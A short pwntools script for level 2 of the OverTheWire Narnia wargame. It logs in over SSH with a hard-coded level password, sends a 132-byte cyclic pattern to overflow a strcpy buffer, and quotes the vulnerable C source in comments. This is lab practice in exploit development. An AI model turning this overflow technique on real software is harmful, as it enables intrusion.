from pwn import *

def setup():
    global shell, user
    context.os = 'linux'
    context.arch = 'x86'
    user = 'narnia2'
    host = 'narnia.labs.overthewire.org'
    password = 'nairiepecu'
    shell = ssh(user, host, password=password)
###############################################

setup()

s = shell.run('bash')
s.recvuntil('$ ').decode()
s.sendline('/narnia/{} {}'.format(user, cyclic(132)))

log.info(s.recvuntil('$ ').decode())




# #include <stdio.h>
#     #include <string.h>
#     #include <stdlib.h>
#
#     int main(int argc, char * argv[]){
#         char buf[128];
#
#         if(argc == 1){
#             printf("Usage: %s argument\n", argv[0]);
#             exit(1);
#         }
#         strcpy(buf,argv[1]);
#         printf("%s", buf);
#
#         return 0;
#     }
